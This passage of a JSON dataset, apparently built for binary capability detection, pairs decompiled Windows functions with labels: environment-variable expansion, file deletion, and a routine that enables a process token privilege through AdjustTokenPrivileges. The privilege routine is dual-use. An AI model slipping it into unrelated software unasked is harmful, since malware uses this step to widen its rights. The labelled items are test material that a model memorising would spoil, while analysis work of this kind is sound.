return;\n}\n",
        "token_count": 621
    },
    "0040a6ff": {
        "rules": [
            "query environment variable"
        ],
        "decompiled_code": "\nuchar * __fastcall fcn.0040a6ff(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint nSize;\n    uint var_4h;\n    \n    puVar4 = NULL;\n    if ((param_1 != 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, 0, 0),  iVar1 != 0)) {\n        iVar3 = iVar1 * 2 + 8;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar3);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        puVar5 = puVar4;\n        if (puVar4 != NULL) {\n            for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, puVar4, iVar1);\n            if (iVar1 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                puVar4 = NULL;\n            }\n        }\n    }\n    return puVar4;\n}\n",
        "token_count": 338
    },
    "0040ae1f": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040ae1f(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    iVar1 = fcn.0040a6ff();\n    if (iVar1 != 0) {\n        param_1 = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(param_1);\n    if (iVar2 == 0) {\n        uVar4 = fcn.0040cd11();\n    }\n    if (iVar1 != 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return uVar4;\n}\n",
        "token_count": 191
    },
    "0040f262": {
        "rules": [
            "modify access privileges"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040f262(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint NewState;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpLuid;\n    uint var_8h;\n    int32_t TokenHandle;\n    \n    TokenHandle = param_2;\n    if (param_2 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n        if (iVar2 != 0) {\n            iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n            iVar2 = 0;\n            if (iVar1 != 0) {\n                var_18h = lpLuid;\n                var_14h = var_8h;\n                NewState = 1;\n                var_10h = 2;\n                iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n        iVar2 = 0;\n        if (iVar1 != 0) {\n            var_18h = lpLuid;\n            var_14h = var_8h;\n            NewState = 1;\n            var_10h = 2;\n            iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 452
    }
}